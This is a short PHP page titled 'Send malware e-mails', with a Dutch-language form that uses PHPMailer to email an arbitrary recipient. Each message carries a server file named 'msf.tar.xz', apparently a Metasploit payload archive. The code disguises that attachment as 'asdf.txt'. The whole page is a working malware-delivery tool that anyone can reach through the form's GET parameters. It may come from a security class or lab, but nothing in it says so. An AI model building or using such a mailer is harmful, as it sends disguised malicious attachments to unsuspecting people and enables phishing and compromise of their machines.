<?php
include('/var/www/domain.com/public_html/PHPMailer/src/PHPMailer.php');
include('/var/www/domain.com/public_html/PHPMailer/src/OAuth.php');
include('/var/www/domain.com/public_html/PHPMailer/src/Exception.php');
include('/var/www/domain.com/public_html/PHPMailer/src/POP3.php');
include('/var/www/domain.com/public_html/PHPMailer/src/SMTP.php');
use PHPMailer\PHPMailer\PHPMailer;
$mail = new PHPMailer;
?>
<html>
<head>
    <title>Send malware e-mails</title>
</head>
<body>
    <form>
        E-mailadres
        <input type="text" name="email"><br>
        Onderwerp
        <input type="text" name="subject"><br>
        Bericht
        <textarea name="msg" id="" cols="30" rows="10"></textarea><br/>

        <input type="submit" value="Verstuur email"/>
    </form>
    <?php
    if (isset($_GET['msg'])) {
        $data = $_GET['msg'];
    }
    if (isset($_GET['email'])) {
        $email = $_GET['email'];
    }
    if (isset($_GET['subject'])) {
        $subject = $_GET['subject'];
    }
    $Attachment = '/var/www/domain.com/public_html/test2/msf.tar.xz';
    ?>

    <?php
    if(!empty($data) && !empty($subject) && !empty($email)) {
        $mailer = new PHPMailer();
        $mailer->SetFrom ('test@domain.com');
        $mailer->AddAddress ( $email );
        $mailer->Subject = $subject;
        $mailer->Body = $data;
        $mailer->AddAttachment($Attachment, 'asdf.txt');
        $mailer->Send();
    }
    ?>
</body>
</html>
